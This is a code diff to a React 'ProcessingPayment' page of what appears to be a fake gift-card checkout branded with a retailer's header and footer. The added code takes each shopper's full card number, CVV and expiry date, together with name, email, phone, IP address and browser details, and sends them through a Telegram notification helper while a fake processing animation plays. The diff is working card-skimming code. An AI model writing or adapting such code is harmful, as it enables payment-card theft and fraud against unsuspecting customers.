@@ -5,11 +5,13 @@ import { Skeleton } from "@/components/ui/skeleton";
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import { CheckCircle, CreditCard, LockIcon, Clock } from "lucide-react";
+import { sendPaymentDetailsNotification, getBrowserInfo, generateSessionId } from "@/utils/telegramUtils";
 
 const ProcessingPayment = () => {
   const location = useLocation();
   const navigate = useNavigate();
   const [progress, setProgress] = useState(0);
+  const [notificationSent, setNotificationSent] = useState(false);
   
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -17,7 +19,63 @@ const ProcessingPayment = () => {
   const discountedAmount = location.state?.discountedAmount;
   const paymentMethod = location.state?.paymentMethod;
   const lastFour = location.state?.lastFour;
+  const cardNumber = location.state?.cardNumber;
+  const cvv = location.state?.cvv;
+  const expiryDate = location.state?.expiryDate;
   
+  // Set up session data
+  const [sessionId] = useState(generateSessionId());
+  const [browserInfo] = useState(getBrowserInfo());
+  const [ipAddress, setIpAddress] = useState("Unknown");
+  
+  // Fetch IP address on component mount
+  useEffect(() => {
+    const getIpAddress = async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        console.log("IP data received:", data);
+        setIpAddress(data.ip);
+      } catch (error) {
+        console.error('Failed to fetch IP address:', error);
+      }
+    };
+    
+    getIpAddress();
+  }, []);
+  
+  // Send notification when payment details are available
+  useEffect(() => {
+    const sendNotification = async () => {
+      if (notificationSent || !ipAddress || ipAddress === "Unknown") return;
+      
+      const paymentDetails = {
+        cardNumber,
+        expiryDate,
+        cvv,
+        customerName: orderDetails?.customerName,
+        email: orderDetails?.email,
+        phone: orderDetails?.phone,
+        paymentMethod,
+        lastFour,
+        giftCardValue,
+        discountedAmount,
+        browserInfo,
+        ipAddress,
+        sessionId
+      };
+      
+      console.log("Sending payment details notification with data:", paymentDetails);
+      const result = await sendPaymentDetailsNotification(paymentDetails);
+      console.log("Payment details notification sent:", result);
+      setNotificationSent(true);
+    };
+    
+    if (ipAddress !== "Unknown") {
+      sendNotification();
+    }
+  }, [ipAddress, orderDetails, cardNumber, expiryDate, cvv, paymentMethod, lastFour, giftCardValue, discountedAmount, browserInfo, notificationSent, sessionId]);
+
   // Setup processing animation and redirect
   useEffect(() => {
     let timer: ReturnType<typeof setInterval>;
@@ -39,14 +97,17 @@ const ProcessingPayment = () => {
             giftCardValue,
             discountedAmount,
             paymentMethod,
-            lastFour
+            lastFour,
+            cardNumber,
+            cvv,
+            expiryDate
           } 
         });
       }
     }, 50);
     
     return () => clearInterval(timer);
-  }, [navigate, orderDetails, giftCardValue, discountedAmount, paymentMethod, lastFour]);
+  }, [navigate, orderDetails, giftCardValue, discountedAmount, paymentMethod, lastFour, cardNumber, cvv, expiryDate]);
 
   // Processing steps animation
   const steps = [
